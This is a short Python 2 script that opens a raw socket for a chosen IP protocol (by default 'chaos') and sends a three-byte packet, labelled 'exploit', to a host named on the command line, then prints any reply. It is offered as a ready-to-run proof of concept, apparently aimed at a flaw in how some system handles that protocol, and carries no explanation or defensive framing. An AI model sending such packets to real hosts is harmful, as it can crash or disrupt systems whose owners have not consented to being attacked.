#!/usr/bin/python

from socket import *
from sys import *

PROTOCOL = 'chaos'

if len(argv) < 2:
	print >>stderr,("Syntax:  %s host [protocol]"%argv[0])
	exit(1)



host = argv[1]
proto = None
try:
	proto = argv[2]
except:
	proto = PROTOCOL

exploit = "\x00\x00\xff"




def send(host, data):
	sock.sendto(data, (host,0))

def recv():
	data,sender = sock.recvfrom(2000)
	print "got %d bytes from %s" % (len(data), repr(sender))
	print "DATA: %s" % (repr(data))


sock = socket(AF_INET, SOCK_RAW, getprotobyname(proto))
send(host, exploit)
recv()



